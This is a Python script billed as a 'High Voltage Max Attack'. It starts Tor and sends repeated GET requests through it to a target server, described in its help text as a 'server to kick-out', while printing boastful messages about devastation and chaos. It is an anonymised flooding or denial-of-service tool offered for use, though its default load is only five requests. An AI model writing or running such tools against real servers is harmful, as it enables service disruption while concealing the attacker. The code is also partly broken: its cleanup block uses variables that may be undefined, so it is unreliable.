import argparse
import datetime
import sys
import random
import time
from lib.color import color
from lib.tor import Tor
from lib.args import parser

def initialize_tor():
    tor = Tor()
    if not tor.tor_installed():
        print('{}[!]{} Tor is not installed. 😡 Exiting...'.format(color.RED, color.END))
        sys.exit(1)
    try:
        tor.init_tor()
        print('{}[!]{} Tor initialized successfully. 🎉'.format(color.BLUE, color.END))
    except Exception as e:
        print('{}[!]{} Error initializing Tor: {}. 😡'.format(color.RED, color.END, e))
        sys.exit(1)
    return tor

def perform_attack(tor, target, max_attempts):
    session = tor.new_session()
    print('\n{}[+]{} Target: {}{}{}. Initiating High Voltage Max Attack! 💥⚡️'.format(color.PURPLE, color.END, color.PURPLE, target, color.END))
    print('{}[*]{} Charging up the energy. Prepare for maximum impact! ⚡️🔥'.format(color.ORANGE, color.END))
    for attempt in range(1, max_attempts + 1):
        try:
            # Simulate a high voltage attack by generating random delays
            delay = random.uniform(0.1, 1.0)  # Random delay between 0.1 and 1.0 seconds
            time.sleep(delay)
            session.get(target)
            print('{}[*]{} Attempt {}: High Voltage Attack unleashed! ⚡️🔥'.format(color.ORANGE, color.END, attempt))
        except Exception as e:
            print('{}[*]{} Attempt {}: Failed to unleash High Voltage Attack: {}. The target remains resilient! 😡🛡️'.format(color.ORANGE, color.END, attempt, e))
    print('{}[*]{} High Voltage Max Attack on {} completed. Witness the devastation! 💥⚡️🔥'.format(color.ORANGE, color.END, target))

def calculate_elapsed_time(start_time):
    end_time = datetime.datetime.now()
    total_time = end_time - start_time
    return total_time

def stop_tor_if_running(tor):
    if tor and tor.is_running():
        print('{}[!]{} Stopping Tor... 😡'.format(color.RED, color.END))
        tor.stop_tor()

def main():
    try:
        parser = argparse.ArgumentParser(description='High Voltage Max Attack')
        parser.add_argument('-t', '--target', type=str, help='server to kick-out', required=True)
        parser.add_argument('-n', '--attempts', type=int, help='number of attempts of attack', default=5)
        args = parser.parse_args()

        target = args.target
        max_attempts = args.attempts

        tor = initialize_tor()

        start_time = datetime.datetime.now()

        perform_attack(tor, target, max_attempts)

    except KeyboardInterrupt:
        pass
    except Exception as exception:
        print('\n{}[!]{} An error has occurred: {}. 😡'.format(color.RED, color.END, exception))

    finally:
        total_time = calculate_elapsed_time(start_time)
        print('{}[+]{} Time elapsed:\t{}. Tremble before my power! ⏳'.format(color.GREEN, color.END, total_time))
        print('{}[+]{} Number of attempts:\t{}. Prepare for the storm! ⛈️'.format(color.GREEN, color.END, max_attempts))
        stop_tor_if_running(tor)
        print('{}[!]{} Exiting... May chaos reign! 🌀\n'.format(color.RED, color.END))
        sys.exit(0)

if __name__ == '__main__':
    main()
